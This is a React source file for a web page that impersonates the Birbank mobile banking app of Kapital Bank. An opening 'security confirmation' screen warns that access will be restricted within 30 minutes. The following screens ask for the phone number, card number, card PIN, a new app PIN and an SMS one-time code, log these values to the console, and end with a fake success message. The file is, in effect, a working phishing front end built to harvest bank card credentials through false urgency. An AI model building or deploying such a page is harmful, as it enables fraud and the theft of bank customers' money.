"use client"

import { useState, useEffect } from "react"

type Screen = "security" | "welcome" | "registration" | "pin-setup" | "otp"

export default function BirbankApp() {
  const [currentScreen, setCurrentScreen] = useState<Screen>("security")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [cardNumber, setCardNumber] = useState("")
  const [pinCode, setPinCode] = useState("")
  const [appPin, setAppPin] = useState("")
  const [otpCode, setOtpCode] = useState("")
  const [otpTimer, setOtpTimer] = useState(118)

  useEffect(() => {
    if (currentScreen === "otp" && otpTimer > 0) {
      const timer = setInterval(() => {
        setOtpTimer((prev) => prev - 1)
      }, 1000)
      return () => clearInterval(timer)
    }
  }, [currentScreen, otpTimer])

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins}:${secs.toString().padStart(2, "0")}`
  }

  const handleSecurityConfirm = () => {
    console.log("[Birbank] Security confirmed - proceeding to welcome screen")
    setCurrentScreen("welcome")
  }

  const handleBranchConfirm = () => {
    alert("Zəhmət olmasa, 3 gün ərzində sizə ən yaxın Birbank filialına müraciət edin. Ünvanlar: Bakı, Sumqayıt, Gəncə.")
    console.log("[Birbank] Branch confirmation selected")
  }

  const handleLogin = () => {
    console.log("[Birbank] Login button clicked")
    setCurrentScreen("registration")
  }

  const handleRegistration = () => {
    console.log("[Birbank] Registration clicked")
    setCurrentScreen("registration")
  }

  const handleContinueRegistration = () => {
    console.log("[Birbank] Registration data:", { phoneNumber, cardNumber, pinCode })
    setCurrentScreen("pin-setup")
  }

  const handlePinKeyPress = (key: string) => {
    if (key === "C") {
      setAppPin("")
      console.log("[Birbank] PIN cleared")
    } else if (key === "backspace") {
      setAppPin((prev) => prev.slice(0, -1))
      console.log("[Birbank] PIN backspace")
    } else if (appPin.length < 4) {
      const newPin = appPin + key
      setAppPin(newPin)
      console.log("[Birbank] PIN input:", newPin)
      if (newPin.length === 4) {
        console.log("[Birbank] PIN complete:", newPin)
        setTimeout(() => {
          setCurrentScreen("otp")
        }, 300)
      }
    }
  }

  const handleOtpKeyPress = (key: string) => {
    if (key === "backspace") {
      if (otpCode.length > 0) {
        setOtpCode((prev) => prev.slice(0, -1))
        console.log("[Birbank] OTP backspace")
      }
    } else if (otpCode.length < 4) {
      const newOtp = otpCode + key
      setOtpCode(newOtp)
      console.log("[Birbank] OTP input:", newOtp)
      if (newOtp.length === 4) {
        console.log("[Birbank] OTP complete:", newOtp)
        alert("Təsdiq uğurlu oldu! (Verification successful!)")
      }
    }
  }

  const isRegistrationValid = phoneNumber.length > 0 && cardNumber.length > 0 && pinCode.length > 0

  // Robot Mascot Component
  const RobotMascot = ({ size = "normal" }: { size?: "normal" | "large" }) => {
    const isLarge = size === "large"
    return (
      <div className="relative inline-block">
        <div 
          className={`${isLarge ? "w-36 h-20" : "w-28 h-16"} bg-[#e30613] rounded-full flex items-center justify-center relative`}
          style={{ borderRadius: "50%" }}
        >
          {/* Left eye */}
          <div className={`absolute ${isLarge ? "left-7" : "left-5"} top-1/2 -translate-y-1/2 ${isLarge ? "w-8 h-8" : "w-6 h-6"} bg-white rounded-full flex items-center justify-center`}>
            <div className={`${isLarge ? "w-4 h-4" : "w-3 h-3"} bg-gray-800 rounded-full`}></div>
          </div>
          {/* Smile */}
          <div 
            className={`absolute ${isLarge ? "right-8" : "right-6"} top-1/2 -translate-y-1/2 ${isLarge ? "w-7" : "w-5"} ${isLarge ? "h-3" : "h-2"}`}
            style={{ 
              borderBottom: "3px solid white", 
              borderRadius: "0 0 50% 50%"
            }}
          ></div>
        </div>
        {/* Left arm */}
        <div className={`absolute ${isLarge ? "-left-2" : "-left-1"} top-1/2 -translate-y-1/2 ${isLarge ? "w-4 h-10" : "w-3 h-8"} bg-[#e30613] rounded-full`}></div>
        {/* Right arm */}
        <div className={`absolute ${isLarge ? "-right-2" : "-right-1"} top-1/2 -translate-y-1/2 ${isLarge ? "w-4 h-10" : "w-3 h-8"} bg-[#e30613] rounded-full`}></div>
      </div>
    )
  }

  // Logo Component
  const Logo = () => (
    <div className="flex items-center justify-center gap-1">
      <div className="w-1.5 h-6 bg-[#e30613] rounded-full"></div>
      <span className="text-lg font-bold text-gray-800">birbank</span>
    </div>
  )

  // Security Screen
  if (currentScreen === "security") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-[#e8f5f0] to-white flex items-center justify-center p-4">
        <div className="w-full max-w-[390px] bg-white rounded-3xl shadow-lg p-6 text-center">
          <Logo />
          
          <div className="my-8">
            <RobotMascot />
          </div>

          <h1 className="text-xl font-bold text-gray-800 mb-4">Təhlükəsizlik təsdiqi</h1>

          <div className="bg-gray-50 rounded-xl p-4 mb-6 text-left text-sm text-gray-700 leading-relaxed">
            <p className="mb-3">
              🔐 Təhlükəsizlik məqsədilə zəhmət olmasa, bütün addımları ardıcıllıqla yerinə yetirin.
            </p>
            <p>
              ⚠️ Əks halda:
              <br />
              30 dəqiqə ərzində məlumatlarınız təsdiqlənmədikdə, tətbiqə girişiniz məhdudlaşdırılacaq və təsdiq yalnız 3 gün ərzində sizə uyğun olan filialda həyata keçirilməlidir.
            </p>
          </div>

          <button
            onClick={handleSecurityConfirm}
            className="w-full bg-[#e30613] text-white font-semibold py-4 rounded-xl mb-3 active:bg-[#c70510] transition-colors"
          >
            Məlumatları təsdiq et
          </button>
          <button
            onClick={handleBranchConfirm}
            className="w-full border-2 border-[#e30613] text-[#e30613] font-semibold py-4 rounded-xl active:bg-red-50 transition-colors"
          >
            Filialda təsdiq
          </button>
        </div>
      </div>
    )
  }

  // Welcome Screen
  if (currentScreen === "welcome") {
    return (
      <div className="min-h-screen bg-gradient-to-b from-[#e8f5f0] to-white flex flex-col items-center p-4">
        <div className="w-full max-w-[390px] flex flex-col items-center pt-8">
          <Logo />

          <div className="my-12">
            <RobotMascot size="large" />
          </div>

          <h1 className="text-2xl font-bold text-gray-800 text-center leading-tight">
            Salam! Mən Biriyəm,
            <br />
            sizin
            <br />
            rəqəmsal köməkçiniz.
          </h1>

          <div className="w-full mt-auto pt-16 pb-20 space-y-2">
            <button
              onClick={handleLogin}
              className="w-full bg-[#e30613] text-white font-semibold py-4 rounded-xl active:bg-[#c70510] transition-colors"
            >
              Giriş
            </button>
            <button
              onClick={handleRegistration}
              className="w-full text-gray-600 font-medium py-4"
            >
              Qeydiyyat
            </button>
          </div>

          {/* Bottom Navigation */}
          <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-100 py-3 px-4">
            <div className="max-w-[390px] mx-auto flex justify-between items-center">
              <div className="flex flex-col items-center text-[#e30613] flex-1">
                <svg className="w-6 h-6" viewBox="0 0 24 24" fill="currentColor">
                  <rect x="2" y="5" width="20" height="14" rx="2" />
                </svg>
                <span className="text-[10px] mt-1">Ana səhifə</span>
              </div>
              <div className="flex flex-col items-center text-gray-400 flex-1">
                <svg className="w-6 h-6" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                  <rect x="2" y="4" width="20" height="16" rx="2" />
                  <line x1="2" y1="10" x2="22" y2="10" />
                </svg>
                <span className="text-[10px] mt-1 text-center leading-tight">Ödənişlər və köçürmələr</span>
              </div>
              <div className="flex flex-col items-center text-gray-400 flex-1">
                <div className="flex gap-1">
                  <div className="w-1.5 h-1.5 bg-current rounded-full"></div>
                  <div className="w-1.5 h-1.5 bg-current rounded-full"></div>
                  <div className="w-1.5 h-1.5 bg-current rounded-full"></div>
                </div>
                <span className="text-[10px] mt-1">Daha çox</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  // Registration Screen
  if (currentScreen === "registration") {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center">
        <div className="w-full max-w-[390px]">
          {/* Header */}
          <div className="flex items-center justify-between p-4">
            <button onClick={() => setCurrentScreen("welcome")} className="text-[#e30613] text-3xl font-light">
              ‹
            </button>
            <span className="text-gray-400 text-sm">Qeydiyyat</span>
            <div className="w-8 h-8 flex items-center justify-center">
              <svg className="w-6 h-6 text-[#e30613]" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 12l8.954-8.955c.44-.439 1.152-.439 1.591 0L21.75 12M4.5 9.75v10.125c0 .621.504 1.125 1.125 1.125H9.75v-4.875c0-.621.504-1.125 1.125-1.125h2.25c.621 0 1.125.504 1.125 1.125V21h4.125c.621 0 1.125-.504 1.125-1.125V9.75M8.25 21h8.25" />
              </svg>
            </div>
          </div>

          {/* Form */}
          <div className="px-4 pt-2">
            <div className="mb-1">
              <span className="text-[10px] text-gray-400 bg-gray-100 px-2 py-0.5 rounded">Müzik</span>
            </div>
            <h1 className="text-xl font-bold text-gray-800 mb-1">Kart üzrə identifikasiya</h1>
            <p className="text-sm text-gray-500 mb-6">
              Mobil nömrəni, Kapital Bank kartının nömrəsini və PIN kodunu daxil edin.
            </p>

            {/* Phone Number */}
            <div className="mb-3">
              <div className="flex items-center border border-gray-200 rounded-xl px-4 py-4">
                <svg className="w-5 h-5 text-gray-400 mr-3 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3" />
                </svg>
                <input
                  type="tel"
                  placeholder="Telefon nömrəsi"
                  value={phoneNumber}
                  onChange={(e) => {
                    setPhoneNumber(e.target.value)
                    console.log("[Birbank] Phone number:", e.target.value)
                  }}
                  className="flex-1 outline-none text-gray-800 placeholder-gray-400 text-sm"
                />
              </div>
            </div>

            {/* Card Number */}
            <div className="mb-3">
              <div className="flex items-center border border-gray-200 rounded-xl px-4 py-4">
                <svg className="w-5 h-5 text-gray-400 mr-3 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 8.25h19.5M2.25 9h19.5m-16.5 5.25h6m-6 2.25h3m-3.75 3h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5z" />
                </svg>
                <input
                  type="text"
                  placeholder="Kart nömrəsi"
                  value={cardNumber}
                  onChange={(e) => {
                    setCardNumber(e.target.value)
                    console.log("[Birbank] Card number:", e.target.value)
                  }}
                  className="flex-1 outline-none text-gray-800 placeholder-gray-400 text-sm"
                />
                <svg className="w-5 h-5 text-gray-400 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M3.75 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 013.75 9.375v-4.5zM3.75 14.625c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5a1.125 1.125 0 01-1.125-1.125v-4.5zM13.5 4.875c0-.621.504-1.125 1.125-1.125h4.5c.621 0 1.125.504 1.125 1.125v4.5c0 .621-.504 1.125-1.125 1.125h-4.5A1.125 1.125 0 0113.5 9.375v-4.5z" />
                  <path strokeLinecap="round" strokeLinejoin="round" d="M6.75 6.75h.75v.75h-.75v-.75zM6.75 16.5h.75v.75h-.75v-.75zM16.5 6.75h.75v.75h-.75v-.75zM13.5 13.5h.75v.75h-.75v-.75zM13.5 19.5h.75v.75h-.75v-.75zM19.5 13.5h.75v.75h-.75v-.75zM19.5 19.5h.75v.75h-.75v-.75zM16.5 16.5h.75v.75h-.75v-.75z" />
                </svg>
              </div>
            </div>

            {/* PIN Code */}
            <div className="mb-4">
              <div className="flex items-center border border-gray-200 rounded-xl px-4 py-4">
                <svg className="w-5 h-5 text-gray-400 mr-3 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 10-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 002.25-2.25v-6.75a2.25 2.25 0 00-2.25-2.25H6.75a2.25 2.25 0 00-2.25 2.25v6.75a2.25 2.25 0 002.25 2.25z" />
                </svg>
                <input
                  type="password"
                  placeholder="Kartın PIN kodu"
                  value={pinCode}
                  onChange={(e) => {
                    setPinCode(e.target.value)
                    console.log("[Birbank] PIN code entered")
                  }}
                  className="flex-1 outline-none text-gray-800 placeholder-gray-400 text-sm"
                />
              </div>
            </div>

            {/* Link */}
            <button className="text-[#e30613] text-sm mb-32">
              Kapital Bank-dan kartım yoxdur
            </button>

            {/* Terms */}
            <p className="text-xs text-gray-500 mb-4">
              {'"Davam et" düyməsinə basmaqla tətbiqin '}
              <span className="text-[#e30613] underline">istifadə şərtləri</span>
              {" ilə razılaşırsan."}
            </p>

            {/* Continue Button */}
            <button
              onClick={handleContinueRegistration}
              disabled={!isRegistrationValid}
              className={`w-full py-4 rounded-xl font-semibold transition-colors ${
                isRegistrationValid
                  ? "bg-[#e30613] text-white active:bg-[#c70510]"
                  : "bg-[#f5c6c9] text-white cursor-not-allowed"
              }`}
            >
              Davam etmək
            </button>
          </div>
        </div>
      </div>
    )
  }

  // PIN Setup Screen
  if (currentScreen === "pin-setup") {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center">
        <div className="w-full max-w-[390px]">
          {/* Header */}
          <div className="flex items-center justify-center p-4 relative">
            <button onClick={() => setCurrentScreen("registration")} className="absolute left-4 text-[#e30613] text-3xl font-light">
              ‹
            </button>
            <span className="text-gray-800 font-medium">Giriş kodu</span>
          </div>

          {/* Content */}
          <div className="px-4 pt-4 text-center">
            <p className="text-gray-500 text-sm mb-12">
              Tətbiqə daha sürətli və rahat giriş üçün kodu təyin edin.
            </p>

            <h2 className="text-lg font-semibold text-gray-800 mb-4">Giriş kodunu təyin edin</h2>

            {/* PIN Dots */}
            <div className="flex justify-center gap-6 mb-24">
              {[0, 1, 2, 3].map((i) => (
                <div
                  key={i}
                  className={`w-4 h-4 rounded-full border-2 transition-colors ${
                    i < appPin.length ? "bg-gray-800 border-gray-800" : "border-gray-300 bg-transparent"
                  }`}
                />
              ))}
            </div>

            {/* Numpad */}
            <div className="grid grid-cols-3 gap-y-6 gap-x-12 px-12">
              {["1", "2", "3", "4", "5", "6", "7", "8", "9", "C", "0", "backspace"].map((key) => (
                <button
                  key={key}
                  onClick={() => handlePinKeyPress(key)}
                  className="h-14 flex items-center justify-center text-2xl text-gray-800 active:bg-gray-100 rounded-full transition-colors"
                >
                  {key === "backspace" ? (
                    <svg className="w-7 h-7 text-gray-600" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" d="M12 9.75L14.25 12m0 0l2.25 2.25M14.25 12l2.25-2.25M14.25 12L12 14.25m-2.58 4.92l-6.375-6.375a1.125 1.125 0 010-1.59L9.42 4.83c.211-.211.498-.33.796-.33H19.5a2.25 2.25 0 012.25 2.25v10.5a2.25 2.25 0 01-2.25 2.25h-9.284c-.298 0-.585-.119-.796-.33z" />
                    </svg>
                  ) : (
                    key
                  )}
                </button>
              ))}
            </div>
          </div>
        </div>
      </div>
    )
  }

  // OTP Screen
  if (currentScreen === "otp") {
    return (
      <div className="min-h-screen bg-white flex flex-col items-center">
        <div className="w-full max-w-[390px]">
          {/* Header */}
          <div className="flex items-center justify-center p-4 relative">
            <button onClick={() => setCurrentScreen("pin-setup")} className="absolute left-4 text-[#e30613] text-3xl font-light">
              ‹
            </button>
            <span className="text-gray-800 font-medium">Doğrulama</span>
          </div>

          {/* Content */}
          <div className="px-4 pt-2">
            <h2 className="text-xl font-bold text-gray-800 mb-1">Doğrulama kodunu daxil edin</h2>
            <p className="text-gray-500 text-sm mb-12">
              Doğrulama kodu nömrəyə göndərildi:
              <br />
              +99***
            </p>

            {/* OTP Input Boxes */}
            <div className="flex justify-center gap-4 mb-4">
              {[0, 1, 2, 3].map((i) => (
                <div
                  key={i}
                  className="w-10 h-10 flex items-center justify-center text-xl font-medium"
                  style={{ 
                    borderBottom: otpCode[i] ? "2px solid #333" : "2px solid #ccc"
                  }}
                >
                  {otpCode[i] || ""}
                </div>
              ))}
            </div>

            {/* Resend Timer */}
            <div className="text-center mb-16">
              <span className="text-gray-500 text-sm">Kodu yenidən göndərmək </span>
              <span className="text-[#e30613] font-medium">{formatTime(otpTimer)}</span>
            </div>

            {/* Numpad - iOS style */}
            <div className="bg-[#d1d5db] p-1 rounded-t-xl">
              {/* Top row icons */}
              <div className="flex justify-around py-2 mb-1">
                <button className="text-gray-500">😊</button>
                <button className="text-gray-500">🎤</button>
                <button className="text-gray-500">⚙️</button>
                <button className="text-gray-500">🔍</button>
                <button className="text-gray-500">📷</button>
                <button className="text-gray-500">•••</button>
              </div>
              
              <div className="grid grid-cols-3 gap-1">
                {["1", "2", "3", "4", "5", "6", "7", "8", "9"].map((key) => (
                  <button
                    key={key}
                    onClick={() => handleOtpKeyPress(key)}
                    className="h-12 bg-white rounded-lg flex items-center justify-center text-xl font-medium text-gray-800 active:bg-gray-200 shadow-sm"
                  >
                    {key}
                  </button>
                ))}
                <div></div>
                <button
                  onClick={() => handleOtpKeyPress("0")}
                  className="h-12 bg-white rounded-lg flex items-center justify-center text-xl font-medium text-gray-800 active:bg-gray-200 shadow-sm"
                >
                  0
                </button>
                <button
                  onClick={() => handleOtpKeyPress("backspace")}
                  className="h-12 bg-[#b8bcc2] rounded-lg flex items-center justify-center active:bg-gray-400 shadow-sm"
                >
                  <svg className="w-6 h-6 text-gray-800" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 9.75L14.25 12m0 0l2.25 2.25M14.25 12l2.25-2.25M14.25 12L12 14.25m-2.58 4.92l-6.375-6.375a1.125 1.125 0 010-1.59L9.42 4.83c.211-.211.498-.33.796-.33H19.5a2.25 2.25 0 012.25 2.25v10.5a2.25 2.25 0 01-2.25 2.25h-9.284c-.298 0-.585-.119-.796-.33z" />
                  </svg>
                </button>
              </div>
              
              {/* Bottom row */}
              <div className="flex justify-between items-center mt-1 px-2 py-2">
                <span className="text-gray-500 text-sm">.-</span>
                <span className="text-blue-500 font-medium text-sm">Edilib</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    )
  }

  return null
}
